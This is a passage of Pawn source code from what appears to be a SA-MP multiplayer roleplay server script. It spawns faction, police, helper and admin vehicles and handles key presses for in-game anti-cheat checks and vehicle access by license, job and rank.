	AttachObjectToVehicle(object8, Copcar[20], -0.009999, 0.169999, 0.879999, 0.000000, 0.000000, 0.000000); //Object Model: 19620 |
	new policecar6 = CreateObject(19327, 1534.2373, -1643.2886, 5.9373,-87.6999, 90.4001, -87.1805);
	SetObjectMaterialText(policecar6, "POLICE", 0, 50, "Arial", 25, 1,-16777216, 0, 1);
	AttachObjectToVehicle(policecar6, Copcar[20], 0.0, -1.9, 0.4, 270.0, 0.0, 0.0);
	new pdtext8 = CreateObject(19327, 1534.2373, -1643.2886, 5.9373, -87.6999, 90.4001, -87.1805);
	SetObjectMaterialText(pdtext8, "POLICE", 0, 50, "Arial", 25, 1, -16777216, 0, 1);
	AttachObjectToVehicle(pdtext8, Copcar[20], 0.000000, 2.115000, 0.294999, -104.519912, -177.885086, 0.00000);*/
	Copcar[20] = AddStaticVehicleEx(426,1562.9956,-1606.3975,13.1259,179.2377,1,1,900);
	new copcarobj4 = CreateObject(19620,-2597.0762,-2638.4270,-5.3536,0.0000,0.0000,0.0000);
	AttachObjectToVehicle(copcarobj4, Copcar[20], 0.000000, 0.000000, 0.884999, 0.000000, 0.000000, 0.000000); //Object Model: 19620 |
	new poccarobj4 = CreateObject(19327, -2597.0762, -2638.4270, -5.3536,-87.6999, 90.4001, -87.1805);
	SetObjectMaterialText(poccarobj4, "LSPD", 0, 50, "Arial", 25, 1,-16777216, 0, 1);
	AttachObjectToVehicle(poccarobj4, Copcar[20], -0.009999, 1.739998, 0.259999, -95.474937, 178.890090, 0.000000); //Object Model: 19327 |
	new copcarbari7 = CreateObject(1182,0,0,-1000,0,0,0,50);
    AttachObjectToVehicle(copcarbari7, Copcar[20], -0.909999, 2.545010, -0.284999, 14.070000, 0.000000, 0.000000); //Object Model: 1182 |
    new copcarbari8 = CreateObject(1182,0,0,-1000,0,0,0,50);
	AttachObjectToVehicle(copcarbari8, Copcar[20], -0.919999, 2.455008, 0.000000, 20.099996, 0.000000, 0.000000); //Object Model: 1182 |

	Copcar[21] = AddStaticVehicleEx(596,1587.5325,-1709.9883,5.6112,359.9413,0,1,900);

	/*Copcar[22] = AddStaticVehicleEx(560,1560.9446,-1605.2637,12.9115,-179.9400,1,1,900, 1);
	object7 = CreateObject(19620,1560.93323,-1605.30579,13.79260,0.00000,0.00000,0.78000);
	AttachObjectToVehicle(object7, Copcar[22], -0.009999, 0.169999, 0.879999, 0.000000, 0.000000, 0.000000); //Object Model: 19620 |
	new policecar5 = CreateObject(19327, 1534.2373, -1643.2886, 5.9373,-87.6999, 90.4001, -87.1805);
	SetObjectMaterialText(policecar5, "POLICE", 0, 50, "Arial", 25, 1,-16777216, 0, 1);
	AttachObjectToVehicle(policecar5, Copcar[22], 0.0, -1.9, 0.4, 270.0, 0.0, 0.0);
	new pdtext9 = CreateObject(19327, 1534.2373, -1643.2886, 5.9373, -87.6999, 90.4001, -87.1805);
	SetObjectMaterialText(pdtext9, "POLICE", 0, 50, "Arial", 25, 1, -16777216, 0, 1);
	AttachObjectToVehicle(pdtext9, Copcar[22], 0.000000, 2.115000, 0.294999, -104.519912, -177.885086, 0.00000);*/
	Copcar[22] = AddStaticVehicleEx(426,1557.8916,-1606.2847,13.1260,180.5179,1,1,900, 1);
	new copcarobj5 = CreateObject(19620,-2597.0762,-2638.4270,-5.3536,0.0000,0.0000,0.0000);
	AttachObjectToVehicle(copcarobj5, Copcar[22], 0.000000, 0.000000, 0.884999, 0.000000, 0.000000, 0.000000); //Object Model: 19620 |
	new poccarobj5 = CreateObject(19327, -2597.0762, -2638.4270, -5.3536,-87.6999, 90.4001, -87.1805);
	SetObjectMaterialText(poccarobj5, "LSPD", 0, 50, "Arial", 25, 1,-16777216, 0, 1);
	AttachObjectToVehicle(poccarobj5, Copcar[22], -0.009999, 1.739998, 0.259999, -95.474937, 178.890090, 0.000000); //Object Model: 19327 |
	new copcarbari9 = CreateObject(1182,0,0,-1000,0,0,0,50);
    AttachObjectToVehicle(copcarbari9, Copcar[22], -0.909999, 2.545010, -0.284999, 14.070000, 0.000000, 0.000000); //Object Model: 1182 |
    new copcarbari10 = CreateObject(1182,0,0,-1000,0,0,0,50);
	AttachObjectToVehicle(copcarbari10, Copcar[22], -0.919999, 2.455008, 0.000000, 20.099996, 0.000000, 0.000000); //Object Model: 1182 |

	Copcar[23] = AddStaticVehicleEx(523,1546.8705,-1615.3568,12.8479,-84.3000,0,0,900);

	Copcar[24] = AddStaticVehicleEx(523,1546.9951,-1613.3981,12.8479,-84.3000,0,0,900);

	Copcar[25] = AddStaticVehicleEx(523,1546.9257,-1611.2958,12.8479,-84.3000,0,0,900);

	Copcar[26] = AddStaticVehicleEx(523,1546.9569,-1608.4889,12.8479,-84.3000,0,0,900);

	Copcar[27] = AddStaticVehicleEx(523,1546.8323,-1606.7531,12.8479,-88.2600,0,0,900);

	/*Copcar[28] = AddStaticVehicleEx(560,1547.5900,-1653.1339,13.1537,90.9600,1,1,900, 1);
	object6 = CreateObject(19620,1547.66040,-1669.63965,13.92120,0.00000,0.00000,91.14000);
	AttachObjectToVehicle(object6, Copcar[28], -0.009999, 0.169999, 0.879999, 0.000000, 0.000000, 0.000000); //Object Model: 19620 |
	new policecar4 = CreateObject(19327, 1534.2373, -1643.2886, 5.9373, -87.6999, 90.4001, -87.1805);
	SetObjectMaterialText(policecar4, "POLICE", 0, 50, "Arial", 25, 1, -16777216, 0, 1);
	AttachObjectToVehicle(policecar4, Copcar[28], 0.0, -1.9, 0.4, 270.0, 0.0, 0.0);
	new pdtext10 = CreateObject(19327, 1534.2373, -1643.2886, 5.9373, -87.6999, 90.4001, -87.1805);
	SetObjectMaterialText(pdtext10, "POLICE", 0, 50, "Arial", 25, 1, -16777216, 0, 1);
	AttachObjectToVehicle(pdtext10, Copcar[28], 0.000000, 2.115000, 0.294999, -104.519912, -177.885086, 0.00000);*/

	/*opcar[28] = AddStaticVehicleEx(426,1547.5900,-1653.1339,13.1537,90.9600,1,1,900, 1);
	new copcarobj6 = CreateObject(19620,-2597.0762,-2638.4270,-5.3536,0.0000,0.0000,0.0000);
	AttachObjectToVehicle(copcarobj6, Copcar[28], 0.000000, 0.000000, 0.884999, 0.000000, 0.000000, 0.000000); //Object Model: 19620 |
	new poccarobj6 = CreateObject(19327, -2597.0762, -2638.4270, -5.3536,-87.6999, 90.4001, -87.1805);
	SetObjectMaterialText(poccarobj6, "LSPD", 0, 50, "Arial", 25, 1,-16777216, 0, 1);
	AttachObjectToVehicle(poccarobj6, Copcar[28], -0.009999, 1.739998, 0.259999, -95.474937, 178.890090, 0.000000); //Object Model: 19327 |
	new copcarbari11 = CreateObject(1182,0,0,-1000,0,0,0,50);
    AttachObjectToVehicle(copcarbari11, Copcar[28], -0.909999, 2.545010, -0.284999, 14.070000, 0.000000, 0.000000); //Object Model: 1182 |
    new copcarbari12 = CreateObject(1182,0,0,-1000,0,0,0,50);
	AttachObjectToVehicle(copcarbari12, Copcar[28], -0.919999, 2.455008, 0.000000, 20.099996, 0.000000, 0.000000); //Object Model: 1182 |*/

	Copcar[29] = AddStaticVehicleEx(428,1583.4308,-1606.5596,13.5062,179.4945,0,1,900);

	Copcar[30] = AddStaticVehicleEx(497,1561.8992,-1651.0338,28.5481,90.9973,0,1,900);

	Copcar[31] = AddStaticVehicleEx(523,1546.8285,-1604.8269,12.8479,-87.1800,0,0,900);

	Copcar[32] = AddStaticVehicleEx(523,1512.6748,-1661.9081,13.1110,273.3558,0,0,900);

	// Los Aztecas
	Aztecasc[1] = AddStaticVehicleEx(560,1460.6954,2762.5344,10.5237,271.5471,98,98,900);
	Aztecasc[2] = AddStaticVehicleEx(567,1461.9623,2753.8328,10.6892,273.3610,98,98,900);
	Aztecasc[3] = AddStaticVehicleEx(445,1461.1525,2786.9851,10.6934,269.1133,98,98,900);
	Aztecasc[4] = AddStaticVehicleEx(566,1461.3575,2794.3330,10.6006,269.0929,98,98,900);
	Aztecasc[5] = AddStaticVehicleEx(461,1474.8593,2780.5283,10.4039,264.9414,98,98,900);
	Aztecasc[6] = AddStaticVehicleEx(461,1475.0002,2782.9585,10.3998,269.8494,98,98,900);
	Aztecasc[7] = AddStaticVehicleEx(475,1529.3812,2809.1833,10.6250,89.6316,98,98,900);
	Aztecasc[8] = AddStaticVehicleEx(482,1529.4087,2818.3010,10.9447,89.9707,98,98,900);
	Aztecasc[9] = AddStaticVehicleEx(409,1529.1504,2827.2883,10.6203,90.1389,98,98,900);
	Aztecasc[10] = AddStaticVehicleEx(487,1512.2842,2841.6584,10.9975,144.0251,98,98,900);
	Aztecasc[11] = AddStaticVehicleEx(405,1494.2539,2838.4846,10.6961,179.5514,98,98,900);
	Aztecasc[12] = AddStaticVehicleEx(405,1484.5641,2838.4858,10.6920,179.3786,98,98,900);
	Aztecasc[13] = AddStaticVehicleEx(579,1465.4622,2838.1118,10.7499,179.9015,98,98,900);
	Aztecasc[14] = AddStaticVehicleEx(579,1475.0416,2838.1453,10.7520,179.7256,98,98,900);

	// Grove Street
	Grovec[1] = AddStaticVehicleEx(487, 741.5534, -1293.7849, 13.6994, 0.0000, -1, -1, 100);
	Grovec[2] = AddStaticVehicleEx(487, 764.0609, -1293.8643, 13.6994, 0.0000, -1, -1, 100);
	Grovec[3] = AddStaticVehicleEx(522, 726.1768, -1294.3231, 13.0595, -96.3600, -1, -1, 100);
	Grovec[4] = AddStaticVehicleEx(522, 726.3545, -1299.3241, 13.0595, -96.3600, -1, -1, 100);
	Grovec[5] = AddStaticVehicleEx(522, 726.3586, -1297.5952, 13.0595, -96.3600, -1, -1, 100);
	Grovec[6] = AddStaticVehicleEx(522, 726.2701, -1296.0027, 13.0595, -96.3600, -1, -1, 100);
	Grovec[7] = AddStaticVehicleEx(560, 742.0734, -1276.8568, 13.1421, 0.0000, -1, -1, 100);
	Grovec[8] = AddStaticVehicleEx(560, 738.7333, -1276.8771, 13.1421, 0.0000, -1, -1, 100);
	Grovec[9] = AddStaticVehicleEx(567, 749.9612, -1276.0021, 13.3393, 0.0000, -1, -1, 100);
	Grovec[10] = AddStaticVehicleEx(567, 746.2326, -1276.0061, 13.3393, 0.0000, -1, -1, 100);
	Grovec[11] = AddStaticVehicleEx(405, 763.5663, -1276.0179, 13.3930, 0.0000, -1, -1, 100);
	Grovec[12] = AddStaticVehicleEx(405, 760.3910, -1275.9952, 13.3930, 0.0000, -1, -1, 100);
	Grovec[13] = AddStaticVehicleEx(579, 770.6275, -1275.6223, 13.4152, 0.0000, -1, -1, 100);
	Grovec[14] = AddStaticVehicleEx(579, 767.2766, -1275.6130, 13.4152, 0.0000, -1, -1, 100);
	Grovec[15] = AddStaticVehicleEx(409, 773.6583, -1274.7158, 13.2587, 0.0000, -1, -1, 100);
	Grovec[16] = AddStaticVehicleEx(545, 726.9821, -1256.5592, 13.3267, 0.0000, -1, -1, 100);
	Grovec[17] = AddStaticVehicleEx(521, 730.0911, -1264.1805, 13.0736, -85.8000, -1, -1, 100);
	Grovec[18] = AddStaticVehicleEx(521, 730.1904, -1270.0750, 13.0736, -85.8000, -1, -1, 100);
	Grovec[19] = AddStaticVehicleEx(521, 730.2411, -1268.1324, 13.0736, -85.8000, -1, -1, 100);
	Grovec[20] = AddStaticVehicleEx(521, 730.0981, -1266.1117, 13.0736, -85.8000, -1, -1, 100);

	// Los Vagos
	Vagosc[1] = AddStaticVehicleEx(560,703.8182,-1420.7809,13.2456,359.3748,6,6,900);
	Vagosc[2] = AddStaticVehicleEx(567,713.9906,-1421.1212,13.4004,359.3567,6,6,900);
	Vagosc[3] = AddStaticVehicleEx(461,702.9658,-1427.0078,13.1210,0.1650,6,6,900);
	Vagosc[4] = AddStaticVehicleEx(461,714.9586,-1426.9335,13.0970,359.2690,6,6,900);
	Vagosc[5] = AddStaticVehicleEx(579,720.4292,-1431.0087,13.4736,88.5139,6,6,900);
	Vagosc[6] = AddStaticVehicleEx(579,727.1696,-1431.2373,13.4597,89.0968,6,6,900);
	Vagosc[7] = AddStaticVehicleEx(409,736.4515,-1431.6168,13.3294,89.7145,6,1,900);
	Vagosc[8] = AddStaticVehicleEx(482,745.3128,-1443.3632,13.6579,0.3060,6,6,900);
	Vagosc[9] = AddStaticVehicleEx(405,703.6475,-1437.2335,13.4147,0.0735,6,6,900);
	Vagosc[10] = AddStaticVehicleEx(405,707.5731,-1437.1660,13.4149,359.2963,6,6,900);
	Vagosc[11] = AddStaticVehicleEx(487,704.3814,-1456.8789,17.5703,357.7882,6,1,900);

	// Ballas
	Ballasc[1] = AddStaticVehicleEx(579,1413.5422,749.4807,10.7580,269.9083,85,1,900);
	Ballasc[2] = AddStaticVehicleEx(579,1413.4001,743.1329,10.7553,269.7700,85,1,900);
	Ballasc[3] = AddStaticVehicleEx(567,1413.2825,762.3490,10.6902,270.8318,85,1,900);
	Ballasc[4] = AddStaticVehicleEx(567,1413.2863,755.9528,10.6858,269.8961,85,1,900);
	Ballasc[5] = AddStaticVehicleEx(405,1413.1633,768.6138,10.6960,270.1100,85,1,900);
	Ballasc[6] = AddStaticVehicleEx(566,1413.4899,775.0634,10.6012,271.0518,85,1,900);
	Ballasc[7] = AddStaticVehicleEx(482,1451.9924,787.3679,10.9385,180.6828,85,1,900);
	Ballasc[8] = AddStaticVehicleEx(445,1445.4983,787.2238,10.6958,180.6648,85,1,900);
	Ballasc[9] = AddStaticVehicleEx(426,1413.0426,711.4196,10.5633,269.5171,85,1,900);
	Ballasc[10] = AddStaticVehicleEx(560,1412.6903,717.7070,10.5259,269.6876,85,1,900);
	Ballasc[11] = AddStaticVehicleEx(487,1416.9390,730.5318,10.9975,267.9874,85,1,900);
	Ballasc[12] = AddStaticVehicleEx(409,1496.3334,732.9077,10.7156,91.8306,85,1,900);
	Ballasc[13] = AddStaticVehicleEx(461,1449.8251,731.3597,10.4061,176.0271,85,1,900);
	Ballasc[14] = AddStaticVehicleEx(461,1453.9224,731.3972,10.4033,181.9228,85,1,900);

	//Helpers
	new helpertext1 = CreateObject(19327, -2597.0762, -2638.4270, -5.3536, -87.6999, 90.4001, -87.1805);
	new helpertext2 = CreateObject(19327, -2597.0762, -2638.4270, -5.3536, -87.6999, 90.4001, -87.1805);
	new helpertext3 = CreateObject(19327, -2597.0762, -2638.4270, -5.3536, -87.6999, 90.4001, -87.1805);
	new helpertext4 = CreateObject(19327, -2597.0762, -2638.4270, -5.3536, -87.6999, 90.4001, -87.1805);
	new helpertext5 = CreateObject(19327, -2597.0762, -2638.4270, -5.3536, -87.6999, 90.4001, -87.1805);
	helpercars[1] = AddStaticVehicleEx(560,892.7222, -1669.5413, 13.1444, 0.0000, 2, 2, 100);
	SetObjectMaterialText(helpertext1, "HELPER", 0, 50, "Arial", 25, 1, -16777216, 0, 1);
	AttachObjectToVehicle(helpertext1, helpercars[1], 0.000000, 2.115000, 0.294999, -104.519912, -177.885086, 0.000000);
	helpercars[2] = AddStaticVehicleEx(560,888.1392, -1669.5321, 13.1444, 0.0000, 2, 2, 100);
	SetObjectMaterialText(helpertext2, "HELPER", 0, 50, "Arial", 25, 1, -16777216, 0, 1);
	AttachObjectToVehicle(helpertext2, helpercars[2], 0.000000, 2.115000, 0.294999, -104.519912, -177.885086, 0.000000);
	helpercars[3] = AddStaticVehicleEx(560,883.7499, -1669.5525, 13.1444, 0.0000, 2, 2, 100);
	SetObjectMaterialText(helpertext3, "HELPER", 0, 50, "Arial", 25, 1, -16777216, 0, 1);
	AttachObjectToVehicle(helpertext3, helpercars[3], 0.000000, 2.115000, 0.294999, -104.519912, -177.885086, 0.000000);
	helpercars[4] = AddStaticVehicleEx(560,879.2927, -1669.5281, 13.1444, 0.0000, 2, 2, 100);
	SetObjectMaterialText(helpertext4, "HELPER", 0, 50, "Arial", 25, 1, -16777216, 0, 1);
	AttachObjectToVehicle(helpertext4, helpercars[4], 0.000000, 2.115000, 0.294999, -104.519912, -177.885086, 0.000000);
	helpercars[5] = AddStaticVehicleEx(560,874.8338, -1669.4906, 13.1444, 0.0000, 2, 2, 100);
	SetObjectMaterialText(helpertext5, "HELPER", 0, 50, "Arial", 25, 1, -16777216, 0, 1);
	AttachObjectToVehicle(helpertext5, helpercars[5], 0.000000, 2.115000, 0.294999, -104.519912, -177.885086, 0.000000);

	//Admins
	new admintext1 = CreateObject(19327, -2597.0762, -2638.4270, -5.3536, -87.6999, 90.4001, -87.1805);
	new admintext2 = CreateObject(19327, -2597.0762, -2638.4270, -5.3536, -87.6999, 90.4001, -87.1805);
	new admintext3 = CreateObject(19327, -2597.0762, -2638.4270, -5.3536, -87.6999, 90.4001, -87.1805);
	new admintext4 = CreateObject(19327, -2597.0762, -2638.4270, -5.3536, -87.6999, 90.4001, -87.1805);
	new admintext5 = CreateObject(19327, -2597.0762, -2638.4270, -5.3536, -87.6999, 90.4001, -87.1805);
	admincars[1] = AddStaticVehicleEx(541, 874.9003, -1657.5371, 13.1468, -180.2400, 2, 2, 100);
	SetObjectMaterialText(admintext1, "ADMIN", 0, 50, "Arial", 25, 1, -16777216, 0, 1);
	AttachObjectToVehicle(admintext1, admincars[1], 0.000000, -1.634998, 0.394999, -78.364997, 0.000000, 0.000000); //Object Model: 19327 |
	admincars[2] = AddStaticVehicleEx(541, 870.3499, -1657.5870, 13.1468, -180.2400, 2, 2, 100);
	SetObjectMaterialText(admintext2, "ADMIN", 0, 50, "Arial", 25, 1, -16777216, 0, 1);
	AttachObjectToVehicle(admintext2, admincars[2], 0.000000, -1.634998, 0.394999, -78.364997, 0.000000, 0.000000); //Object Model: 19327 |
	admincars[3] = AddStaticVehicleEx(541, 879.4915, -1657.4695, 13.1468, -180.2400, 2, 2, 100);
	SetObjectMaterialText(admintext3, "ADMIN", 0, 50, "Arial", 25, 1, -16777216, 0, 1);
	AttachObjectToVehicle(admintext3, admincars[3], 0.000000, -1.634998, 0.394999, -78.364997, 0.000000, 0.000000); //Object Model: 19327 |
	admincars[4] = AddStaticVehicleEx(541, 883.7678, -1657.4855, 13.1468, -180.2400, 2, 2, 100);
	SetObjectMaterialText(admintext4, "ADMIN", 0, 50, "Arial", 25, 1, -16777216, 0, 1);
	AttachObjectToVehicle(admintext4, admincars[4], 0.000000, -1.634998, 0.394999, -78.364997, 0.000000, 0.000000); //Object Model: 19327 |
	admincars[5] = AddStaticVehicleEx(541, 888.1348, -1657.6543, 13.1468, -180.2400, 2, 2, 100);
	SetObjectMaterialText(admintext5, "ADMIN", 0, 50, "Arial", 25, 1, -16777216, 0, 1);
	AttachObjectToVehicle(admintext5, admincars[5], 0.000000, -1.634998, 0.394999, -78.364997, 0.000000, 0.000000); //Object Model: 19327 |
	return 1;
}

public OnPlayerKeyStateChange(playerid, newkeys, oldkeys)
{
   new newcar = GetClosestVehicle2(playerid, 40);
   new veh = GetPlayerVehicleID(playerid);
   new engine,lights,alarm,doors,bonnet,boot,objective;
   if(newkeys & KEY_JUMP && !(oldkeys & KEY_JUMP) && GetPlayerSpecialAction(playerid) == SPECIAL_ACTION_CUFFED) ApplyAnimation(playerid, "GYMNASIUM", "gym_jog_falloff",4.1,0,1,1,0,0);
   if(newkeys & KEY_FIRE || newkeys & KEY_AIM)
   {
	   new weapon = GetPlayerWeapon(playerid),
           slot = GetWeaponSlot(weapon);
	   if(GetPlayerState(playerid) != PLAYER_STATE_DRIVER && WeaponData[playerid][slot] == false && slot != 0 && weapon != 46  && GetPlayerWeapon(playerid) != 9 && curatj[playerid] == 0)
       {
           ResetPlayerWeaponsEx(playerid);
           ResetPlayerWeapons(playerid);
		   new sendername[25],gunname[50],string[256];
		   GetWeaponNameEx(weapon,gunname,sizeof(gunname));
		   GetPlayerName(playerid, sendername, sizeof(sendername));
		   format(string, sizeof(string), "{0000ff}[Anti-Cheat]:{FFFFFF} %s (%d, level %d) may be using weapon hack, weapon created: %s.",sendername, playerid, PlayerInfo[playerid][pLevel], gunname);
		   ABroadCast(COLOR_RED,string,1);
		   return 1;
	   }
   }
   if(newkeys & KEY_FIRE) //Anti DM la spawn
   {
		if(!IsPlayerInAnyVehicle(playerid))
		{
			new wep = GetPlayerWeapon(playerid);
			if((wep > 0 && wep < 43) && IsPlayerInRangeOfPoint(playerid, 50,1799.3353,-1857.7065,13.4141) && !IsACop(playerid) && GetPlayerVirtualWorld(playerid) < 1)
			{
	    		SetPlayerArmedWeapon(playerid,0);
				SendClientMessage(playerid, COLOR_RED, "You can not use weapons spawn in the community. You spend 30-90 minutes in jail for DM!");
			}
   		}
   }
   if(IsKeyJustDown(KEY_SECONDARY_ATTACK, newkeys, oldkeys) && GetPlayerState(playerid) == PLAYER_STATE_ONFOOT)
   {
   		if(IsABoat(newcar))
		{
		    if(PlayerInfo[playerid][pBoatLic] < 1)
			{
                if(TakingLesson[playerid] == 2) { }
                else {
			    SendClientMessage(playerid,COLOR_GREY, "You don't have a boat license.");
			    ClearAnimations(playerid); }
			}
		}
		if(IsAPlane(newcar))
		{
		    if(PlayerInfo[playerid][pFlyLic] < 1)
			{
			    if(TakingLesson[playerid] == 2) { }
			    else {
			    SendClientMessage(playerid, COLOR_GREY, "You don't have a flying license.");
			    ClearAnimations(playerid); }
			}
		}
		if(GetVehicleModel(newcar) >= 400 && GetVehicleModel(newcar) <= 611)
		{
			if(PlayerInfo[playerid][pCarLic] < 1)
			{
			    if(IsABike(newcar) || GetVehicleModel(newcar) == 462) { }
			    else
			    {
					if(TakingLesson[playerid] == 1) { }
					else {
				 	SendClientMessage(playerid,COLOR_GREY, "You don't have a driving license.");
                    ClearAnimations(playerid);
				  }
				}
			}
		}
		if(IsACopCar(newcar))
		{
		    if(IsACop(playerid)) { }
		    else { ClearAnimations(playerid); SendClientMessage(playerid,COLOR_SERVER, "{999999}You are not a Cop."); }
		}
		if(newcar == Copcar[6] || newcar == Copcar[7] || newcar == Copcar[18] || newcar == Copcar[19])
		{
		    if(IsACop(playerid))
		    {
		        if(PlayerInfo[playerid][pRank] < 3)
		        {
		        	ClearAnimations(playerid);
		        	SendClientMessage(playerid,COLOR_SERVER, "{999999}You don't have rank 3.");
		        }
			}
		}
		if(newcar == Copcar[1] || newcar == Copcar[2] || newcar == Copcar[3] || newcar == Copcar[14] || newcar == Copcar[29])
		{
		    if(IsACop(playerid))
		    {
		        if(PlayerInfo[playerid][pRank] < 2)
		        {
		        	ClearAnimations(playerid);
		        	SendClientMessage(playerid,COLOR_SERVER, "{999999}You don't have rank 2.");
		        }
			}
		}
		if(newcar == Copcar[30] || newcar == Copcar[19])
		{
		    if(IsACop(playerid))
		    {
		        if(PlayerInfo[playerid][pRank] < 4)
		        {
		        	ClearAnimations(playerid);
		        	SendClientMessage(playerid,COLOR_SERVER, "{999999}You don't have rank 4.");
		        }
			}
		}
		if(IsAFbiCar(newcar))
		{
		    if(IsACop(playerid)) { }
		    else { ClearAnimations(playerid); SendClientMessage(playerid,COLOR_SERVER, "{999999}You are not a Cop. !"); }
		}
		if(IsALVPDCar(newcar))
		{
		    if(IsACop(playerid)) { }
		    else { ClearAnimations(playerid); SendClientMessage(playerid,COLOR_SERVER, "{999999}You are not a Cop. !"); }
		}
		if(IsASFPDCar(newcar))
		{
		    if(IsACop(playerid)) { }
		    else { ClearAnimations(playerid); SendClientMessage(playerid,COLOR_SERVER, "{999999}You are not a Cop. !"); }
		}
		if(IsANgCar(newcar))
		{
		    if(IsACop(playerid)) { }
		    else { ClearAnimations(playerid); SendClientMessage(playerid,COLOR_SERVER, "{999999}You are not a Cop."); }
		}
		else if(IsAnAmbulance(newcar))
		{
		    if(PlayerInfo[playerid][pMember] == 14) { }
		    else { ClearAnimations(playerid); SendClientMessage(playerid,COLOR_SERVER, "{999999}You are not a Paramedic.");}
		}
		if(IsAGarbageTruck(newcar))//garbagejob
		{
		    if(PlayerInfo[playerid][pJob] == 10) { }
			else
			{
   				SendClientMessage(playerid, COLOR_SERVER, "You are not a Garbage Collector.");
			    ClearAnimations(playerid);
			}
		}
		if(IsATruck(newcar))
		{
			if(PlayerInfo[playerid][pJob] == 14) { }
    		else
			{
   				SendClientMessage(playerid, COLOR_SERVER, "{999999}You are not a Trucker.");
			    ClearAnimations(playerid);
			}
		}

		if(newcar == bus[1] || newcar == bus[2] || newcar == bus[3] || newcar == bus[4] || newcar == bus[5] || newcar == bus[6] || newcar == bus[7] || newcar == bus[8] || newcar == bus[9] || newcar == bus[10] || newcar == bus[11] || newcar == bus[12] || newcar == bus[13]
		|| newcar == bus[14] || newcar == bus[15] || newcar == bus[16])
		{
		    if(PlayerInfo[playerid][pJob] == 7) { }
		    else
			{
		        SendClientMessage(playerid,COLOR_SERVER,"{999999}You are not a Bus Driver.");
		        ClearAnimations(playerid);
		    }
		}
		if(newcar == pizza[1] || newcar == pizza[2] || newcar == pizza[3] || newcar == pizza[4] || newcar == pizza[5] || newcar == pizza[6] || newcar == pizza[7] || newcar == pizza[8] || newcar == pizza[9] || newcar == pizza[10] || newcar == pizza[11] || newcar == pizza[12] || newcar == pizza[13] || newcar == pizza[14])
		{
		    if(PlayerInfo[playerid][pJob] == 5) { }
		    else
			{
		        SendClientMessage(playerid,COLOR_SERVER,"{999999}You are not a Pizza Boy.");
		        ClearAnimations(playerid);
		    }
		}
		if(newcar == towcar[1] || newcar == towcar[2] || newcar == towcar[3] || newcar == towcar[4] || newcar == towcar[5])
		{
		    if(PlayerInfo[playerid][pJob] == 8) { }
		    else
			{
		        SendClientMessage(playerid,COLOR_SERVER,"{999999}You are not a mechanic.");
		        ClearAnimations(playerid);
		    }
		}
		if(newcar == taxic[1] || newcar == taxic[2] || newcar == taxic[3] || newcar == taxic[4] || newcar == taxic[5] || newcar == taxic[6] || newcar == taxic[7] || newcar == taxic[8] || newcar == taxic[9] || newcar == taxic[10])
		{
		    if(PlayerInfo[playerid][pMember] == 13||PlayerInfo[playerid][pLeader] == 13) { }
		    else
			{
		        SendClientMessage(playerid,COLOR_SERVER,"{999999}You are not a Los Santos Taxi member.");
		        ClearAnimations(playerid);
		    }
		}
		if(newcar == taxic[6] || newcar == taxic[7])
		{
		    if(PlayerInfo[playerid][pMember] == 13 || PlayerInfo[playerid][pLeader] == 13)
		    {
				if(PlayerInfo[playerid][pRank] > 2) { }
			    else
				{
			        SendClientMessage(playerid,COLOR_SERVER,"{999999}You don't have rank 3.");
			        ClearAnimations(playerid);
			    }
			}
			else
			{
		        SendClientMessage(playerid,COLOR_SERVER,"{999999}You are not a Los Santos Taxi member or you don't have rank 3.");
		        ClearAnimations(playerid);
		    }
		}
		if(newcar == Aztecasc[1] || newcar == Aztecasc[2] || newcar == Aztecasc[3] || newcar == Aztecasc[4] || newcar == Aztecasc[5] || newcar == Aztecasc[6] || newcar == Aztecasc[7] || newcar == Aztecasc[8] || newcar == Aztecasc[9] || newcar == Aztecasc[10] || newcar == Aztecasc[11]
		|| newcar == Aztecasc[12] || newcar == Aztecasc[13] || newcar == Aztecasc[14])
		{
		    if(PlayerInfo[playerid][pMember] == 4||PlayerInfo[playerid][pLeader] == 4) { }
		    else
			{
		        SendClientMessage(playerid,COLOR_SERVER,"{999999}You are not a Los Aztecas member.");
		        ClearAnimations(playerid);
		    }
		}
		if(newcar == Grovec[1] || newcar == Grovec[2] || newcar == Grovec[3] || newcar == Grovec[4] || newcar == Grovec[5] || newcar == Grovec[6] || newcar == Grovec[7] || newcar == Grovec[8] || newcar == Grovec[9] || newcar == Grovec[10] || newcar == Grovec[11] || newcar == Grovec[12])
		{
		    if(PlayerInfo[playerid][pMember] == 5||PlayerInfo[playerid][pLeader] == 5) { }
		    else
			{
		        SendClientMessage(playerid,COLOR_SERVER,"{999999}You are not a Grove Street member.");
		        ClearAnimations(playerid);
		    }
		}
		if(newcar == Vagosc[1] || newcar == Vagosc[2] || newcar == Vagosc[3] || newcar == Vagosc[4] || newcar == Vagosc[5] || newcar == Vagosc[6]
		 || newcar == Vagosc[7] || newcar == Vagosc[8] || newcar == Vagosc[9] || newcar == Vagosc[10] || newcar == Vagosc[11])
		{
		    if(PlayerInfo[playerid][pMember] == 6||PlayerInfo[playerid][pLeader] == 6) { }
		    else
			{
		        SendClientMessage(playerid,COLOR_SERVER,"{999999}You are not a Los Vagos member.");
		        ClearAnimations(playerid);
		    }
		}
		if(newcar == Ballasc[1] || newcar == Ballasc[2] || newcar == Ballasc[3] || newcar == Ballasc[4] || newcar == Ballasc[5] || newcar == Ballasc[6]
		 || newcar == Ballasc[7] || newcar == Ballasc[8] || newcar == Ballasc[9] || newcar == Ballasc[10] || newcar == Ballasc[11] || newcar == Ballasc[12] || newcar == Ballasc[13] || newcar == Ballasc[14])
		{
		    if(PlayerInfo[playerid][pMember] == 10||PlayerInfo[playerid][pLeader] == 10) { }
		    else
			{
		        SendClientMessage(playerid,COLOR_SERVER,"{999999}You are not a Ballas member.");
		        ClearAnimations(playerid);
		    }
		}
		if(newcar == thea[1] || newcar == thea[2] || newcar == thea[3] || newcar == thea[4] || newcar == thea[5] || newcar == thea[6] || newcar == thea[7] || newcar == thea[8] || newcar == thea[9] || newcar == thea[10] || newcar == thea[11]
  		 || newcar == thea[12] || newcar == thea[13] || newcar == thea[14] || newcar == thea[15] || newcar == thea[16])
		{
		    if(PlayerInfo[playerid][pMember] == 11 || PlayerInfo[playerid][pLeader] == 11) { }
		    else
			{
		        SendClientMessage(playerid, COLOR_SERVER,"{999999}You are not a Hitman.");
		        ClearAnimations(playerid);
		    }
		}
		if(newcar == helpercars[1] || newcar == helpercars[2] || newcar == helpercars[3] || newcar == helpercars[4] || newcar == helpercars[5])
		{
		    if(PlayerInfo[playerid][pHelper] >= 1) { }
		    else
			{
		        SendClientMessage(playerid, COLOR_SERVER,"{999999}You are not a Helper.");
		        ClearAnimations(playerid);
		    }
		}
